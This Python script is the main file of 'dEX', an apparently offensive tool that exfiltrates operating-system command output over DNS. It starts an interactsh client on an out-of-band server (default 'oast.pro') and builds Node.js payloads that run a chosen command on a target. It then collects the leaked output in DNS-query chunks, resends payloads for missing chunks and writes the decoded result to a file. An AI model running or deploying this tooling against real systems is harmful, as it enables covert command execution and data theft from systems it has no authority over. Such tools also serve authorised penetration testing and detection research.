import argparse
import logging
from utils.prerequisites import check_prerequisites
from utils.logging_utils import setup_logger
from utils.decoding import decode_char_codes
from interactsh.client import start_client
from interactsh.payload import generate_init_payload, generate_missing_chunks_payload
from interactsh.logs import get_oob_server_id, wait_for_initial_query, collect_data_chunks

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="dEX: A tool to send OS command output over DNS, with support for handling missing chunks."
    )
    parser.add_argument('-s', '--server', type=str, default='oast.pro',
                        help="interactsh server(s) to use (default: 'oast.pro')")
    parser.add_argument('-c', '--chunk', type=int, default=10,
                        help="chunk size for splitting data (default: 10)")
    parser.add_argument('-pi', '--poll-interval', type=int, default=30,
                        help="poll interval in seconds to pull interaction data (default: 30)")
    parser.add_argument('-m', '--module', type=str, required=True,
                        help="module to generate payloads", choices=['nodejs'])
    parser.add_argument('-cmd', '--command', type=str, required=True,
                        help="command to execute with the modules")
    parser.add_argument('-o', '--output', type=str, required=True,
                        help="output file where results will be written")
    return parser.parse_args()

def main():
    """
    Main function to execute the tool logic.
    """
    setup_logger()
    check_prerequisites(['interactsh-client'])

    args = parse_arguments()

    interactsh_log = './logs/interactsh.log'
    process = start_client(args.server, log_file=interactsh_log)

    try:
        # Step 1: Get the OOB server ID
        oob_server = get_oob_server_id(interactsh_log, args.server)

        # Step 2: Generate and log the initialization payload
        init_payload = generate_init_payload(oob_server, args.server, args.chunk, args.command, args.module)
        logging.info(f'Payload generated for initialization: {init_payload}')
        
        # Step 3: Wait for the initialization query and get the expected chunk count
        queries_count, init_index = wait_for_initial_query(interactsh_log, oob_server)

        # Step 4: Collect data chunks, handle missing chunks if necessary
        logging.info(f"Initialization query received. Awaiting completion of {queries_count} queries to finalize data retrieval. Delaying for {args.poll_interval} seconds to receive additional queries...")

        receive_logs = [''] * queries_count
        while True:
            receive_logs = collect_data_chunks(interactsh_log, oob_server, args.chunk, queries_count, init_index, args.poll_interval)

            # Check for missing chunks
            missing_indices = [i for i, chunk in enumerate(receive_logs) if not chunk]
            if not missing_indices:
                break

            # Generate and log the payload for missing chunks
            missing_payload = generate_missing_chunks_payload(
                missing_indices, oob_server, args.server, args.chunk, args.command, args.module
            )
            logging.info(f"Missing chunks detected: Received {queries_count - len(missing_indices)}/{queries_count} queries. Use the following payload to retrieve missing data: {missing_payload}")

        # Step 5: Write the decoded data to the output file
        decoded_string = decode_char_codes(receive_logs)
        with open(args.output, 'w') as file:
            file.write(decoded_string)
        logging.info(f"Decoded data written to {args.output}")

    except Exception as e:
        logging.error(f"An error occurred: {e}")
    finally:
        process.terminate()
        logging.info("Interactsh client process terminated.")


if __name__ == "__main__":
    main()
